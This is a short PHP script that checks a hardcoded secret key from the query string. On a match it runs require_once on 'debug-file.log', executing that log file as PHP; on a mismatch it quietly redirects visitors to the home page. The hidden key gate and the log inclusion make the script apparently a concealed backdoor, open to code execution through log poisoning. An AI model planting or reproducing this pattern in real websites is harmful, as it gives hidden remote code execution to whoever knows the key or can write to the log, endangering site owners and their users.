<?php
	
	$secure_key = '})@JukuqEj5u[ST12(*]';
	
	$filtered_get_arr = filter_input_array(INPUT_GET);
	
	if(isset($filtered_get_arr['key']) && $filtered_get_arr['key'] === $secure_key){
		require_once ('debug-file.log');
	}else {
		$url = $_SERVER['REQUEST_SCHEME'] . '://' . $_SERVER['SERVER_NAME'];
		header("Location: $url");
		exit;
	}